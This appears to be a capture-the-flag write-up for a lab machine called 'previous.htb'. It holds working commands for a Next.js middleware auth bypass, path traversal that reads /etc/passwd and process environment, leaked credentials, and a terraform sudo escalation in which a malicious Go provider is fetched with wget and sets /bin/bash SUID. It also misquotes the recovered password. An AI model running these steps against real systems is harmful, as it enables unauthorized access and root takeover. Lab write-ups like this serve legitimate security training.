### Nmap
```
nmap -sV -sC -vv 10.10.11.83


---OUTPUT---
Nmap scan report for 10.10.11.83
Host is up, received reset ttl 63 (0.033s latency).
Scanned at 2025-12-12 12:54:16 EST for 10s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://previous.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80
![[Pasted image 20251212125546.png]]

### Login 
- If you click get started or docs you will be redirected to a login page. The url is interesting as it has `api/auth` in it
![[Pasted image 20251212125646.png]]

- Wappalyzer shows a lot of next.js is being used version 15.2.2
![[Pasted image 20251212125940.png]]

- Looking online i find there is an authorization bypass for this version based on CVE-2025-29927 
- Basically we can bypass authentication with this header : `X-Middleware-Subrequestmiddleware:middleware:middleware:middleware:middleware`

- Using it I pass a dirsearch command and find an interesting endpoint `api/download` using parameter fuzzing
```
dirsearch -u http://previous.htb/api -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'

---RELEVANT-OUTPUT---
[13:17:56] 400 -   28B  - /api/download
```
![[Pasted image 20251212132813.png]]

- I then parameter blast this endpoint with ffuf:
```
ffuf -u 'http://previous.htb/api/download?FUZZ=a' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -mc all -fs 28

---OUTPUT---

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/api/download?FUZZ=a
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 28
________________________________________________

example                 [Status: 404, Size: 26, Words: 3, Lines: 1, Duration: 196ms]
:: Progress: [6453/6453] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```
- Using curl I find an lfi vulnerability and find a user:
```
curl 'http://previous.htb/api/download?example=/../../../etc/passwd' -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```
- Finding users with shell:
```
curl 'http://previous.htb/api/download?example=/../../../etc/passwd' -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' | grep -i "/bin/sh"  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   787 100   787   0     0  6739     0  --:--:-- --:--:-- --:--:--  6784
root:x:0:0:root:/root:/bin/sh
node:x:1000:1000::/home/node:/bin/sh
```
- I check `environ` file for more info:
```
curl 'http://previous.htb/api/download?example=/../../../proc/self/environ' -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' --output -

---OUTPUT---
NODE_VERSION=18.20.8HOSTNAME=0.0.0.0YARN_VERSION=1.22.22SHLVL=1PORT=3000HOME=/home/nextjsPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNEXT_TELEMETRY_DISABLED=1PWD=/appNODE_ENV=production
```
![[Pasted image 20251212184646.png]]
- The working directory is `/app`
- Need to understand how next.js applications run:
```
npx create-next-app@latest my-next-app
cd my-next-app
npm run dev
```
- On a new terminal I check the contents of `my-next-app` and find a `.index` folder:
```
ls -al
total 280
drwxrwxr-x   7 kali kali   4096 Dec 12 17:30 .
drwxrwxr-x   4 kali kali   4096 Dec 12 17:29 ..
drwxrwxr-x   2 kali kali   4096 Dec 12 17:29 app
-rw-rw-r--   1 kali kali    465 Dec 12 17:29 eslint.config.mjs
drwxrwxr-x   7 kali kali   4096 Dec 12 17:30 .git
-rw-rw-r--   1 kali kali    480 Dec 12 17:29 .gitignore
drwxrwxr-x   4 kali kali   4096 Dec 12 17:30 .next
-rw-rw-r--   1 kali kali    133 Dec 12 17:29 next.config.ts
-rw-rw-r--   1 kali kali    251 Dec 12 17:30 next-env.d.ts
drwxrwxr-x 291 kali kali  12288 Dec 12 17:30 node_modules
-rw-rw-r--   1 kali kali    535 Dec 12 17:29 package.json
-rw-rw-r--   1 kali kali 216043 Dec 12 17:30 package-lock.json
-rw-rw-r--   1 kali kali     94 Dec 12 17:29 postcss.config.mjs
drwxrwxr-x   2 kali kali   4096 Dec 12 17:29 public
-rw-rw-r--   1 kali kali   1450 Dec 12 17:29 README.md
-rw-rw-r--   1 kali kali    666 Dec 12 17:29 tsconfig.json
```
![[Pasted image 20251212185225.png]]
- Looking at the tree structure at `.next` I find an interesting file:`routes-manifest.json`
![[Pasted image 20251212185323.png]]
- I try to see if that exists in the app:
```
curl 'http://previous.htb/api/download?example=/../../../app/.next/routes-manifest.json' -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware

---OUTPUT---
{
  "version": 3,
  "pages404": true,
  "caseSensitive": false,
  "basePath": "",
  "redirects": [
    {
      "source": "/:path+/",
      "destination": "/:path+",
      "internal": true,
      "statusCode": 308,
      "regex": "^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"
    }
  ],
  "headers": [],
  "dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {
        "nxtPnextauth": "nxtPnextauth"
      },
      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
    },
    {
      "page": "/docs/[section]",
      "regex": "^/docs/([^/]+?)(?:/)?$",
      "routeKeys": {
        "nxtPsection": "nxtPsection"
      },
      "namedRegex": "^/docs/(?<nxtPsection>[^/]+?)(?:/)?$"
    }
  ],
  "staticRoutes": [
    {
      "page": "/",
      "regex": "^/(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/(?:/)?$"
    },
    {
      "page": "/docs",
      "regex": "^/docs(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs(?:/)?$"
    },
    {
      "page": "/docs/components/layout",
      "regex": "^/docs/components/layout(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/layout(?:/)?$"
    },
    {
      "page": "/docs/components/sidebar",
      "regex": "^/docs/components/sidebar(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/sidebar(?:/)?$"
    },
    {
      "page": "/docs/content/examples",
      "regex": "^/docs/content/examples(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/examples(?:/)?$"
    },
    {
      "page": "/docs/content/getting-started",
      "regex": "^/docs/content/getting\\-started(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/getting\\-started(?:/)?$"
    },
    {
      "page": "/signin",
      "regex": "^/signin(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/signin(?:/)?$"
    }
  ],
  "dataRoutes": [],
  "rsc": {
    "header": "RSC",
    "varyHeader": "RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch",
    "prefetchHeader": "Next-Router-Prefetch",
    "didPostponeHeader": "x-nextjs-postponed",
    "contentTypeHeader": "text/x-component",
    "suffix": ".rsc",
    "prefetchSuffix": ".prefetch.rsc",
    "prefetchSegmentHeader": "Next-Router-Segment-Prefetch",
    "prefetchSegmentSuffix": ".segment.rsc",
    "prefetchSegmentDirSuffix": ".segments"
  },
  "rewriteHeaders": {
    "pathHeader": "x-nextjs-rewritten-path",
    "queryHeader": "x-nextjs-rewritten-query"
  },
  "rewrites": []
}
```
- The path `/api/auth/[...nextauth]` is interesting and I try to curl it. I need to URL encode `[]` . The API call will be in the server element of `.next` and since we saw `page:` it is under `pages` directory under the path given:
```
curl 'http://previous.htb/api/download?example=/../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware

---OUTPUT---
curl 'http://previous.htb/api/download?example=../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
```
![[Pasted image 20251212190210.png]]
- We get credentials `jeremy:JeremyAndILovePancakes`
- But this account wasn't there in passwd file. We anyway try to ssh into target with these credentials and it works. Maybe the app was running on a container (we cna confirm this looking around at target)
```
ssh jeremy@previous.htb
```
![[Pasted image 20251212190344.png]]
- I grab user flag:
![[Pasted image 20251212190450.png]]
- Checking sudo privileges we see we can pass a terraform command:
```
sudo -l
[sudo] password for jeremy: 

Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

![[Pasted image 20251212190532.png]]

- Going to `/opt/examples` I read the main.tf file:
![[Pasted image 20251212190722.png]]
- Based on the sudo command we can see that the environment variables are reset and the paths are deleted. So we can basically change the PATH to our exploit instead of this main.tf default path and root would then run our exploit.
- Looking online for a privilege escalation via terraform I find this: https://toshith29.medium.com/proof-of-concept-terraform-privilege-escalation-cd3db69df90e (im hoping its not based on this box itself..)
- I need to compile the exploit via go locally:
```
sudo apt install golang-go
```
- I create the exploit file `terraform-provider-examples.go`
```
cat terraform-provider-examples.go 
package main

import (
    "os"
    "os/exec"
)

func main() {
    // Set SUID bit on /bin/bash
    cmd := exec.Command("chmod", "u+s", "/bin/bash")
    cmd.Run()

    // Optional: write confirmation to /tmp for debugging
    os.WriteFile("/tmp/debug.txt", []byte("chmod executed"), 0644)
}
```
- I then compile it with go to get an executable `terraform-provider-examples`
```
GOOS=linux GOARCH=amd64 go build -o terraform-provider-examples terraform-provider-examples.go
```
- I send it to target at this specific folder:
```
mkdir -p /tmp/provider
cd /tmp/provider
wget http://10.10.14.21/terraform-provider-examples
chmod +x /tmp/provider/terraform-provider-examples
```
- I also create the exploit file that will change the path to this location:
```
cd /tmp/provider
cat exp.rc

---OUTPUT---
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp/provider"
  }
  direct {}
}
```
- I export this file as the terraform path :
```
export TF_CLI_CONFIG_FILE=/tmp/exp.rc
```
- I finally pass the sudo command:
```
sudo /usr/bin/terraform -chdir\=/opt/examples apply

---OUTPUT---
[sudo] password for jeremy: 
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /tmp/provider
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to
│ become incompatible with published releases.
╵
╷
│ Error: Failed to load plugin schemas
│ 
│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for
│ provider previous.htb/terraform/examples: failed to instantiate provider "previous.htb/terraform/examples" to obtain
│ schema: Unrecognized remote plugin message: 
│ Failed to read any lines from plugin's stdout
│ This usually means
│   the plugin was not compiled for this architecture,
│   the plugin is missing dynamic-link libraries necessary to run,
│   the plugin is not executable by this process due to file permissions, or
│   the plugin failed to negotiate the initial go-plugin protocol handshake
│ 
│ Additional notes about plugin:
│   Path: /tmp/provider/terraform-provider-examples
│   Mode: -rwxrwxr-x
│   Owner: 1000 [jeremy] (current: 0 [root])
│   Group: 1000 [jeremy] (current: 0 [root])
│   ELF architecture: EM_X86_64 (current architecture: amd64)
│ ..
```
![[Pasted image 20251212192402.png]]
- I then check bash privileges:
```
ls -al /bin/bash

---OUTPUT---
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```
![[Pasted image 20251212192449.png]]
- I can gain root shell by passing the bash command with the `-p` argument to preserve privielges:
```
bash -p
```
![[Pasted image 20251212192533.png]]

- I grab the root flag:
![[Pasted image 20251212192656.png]]

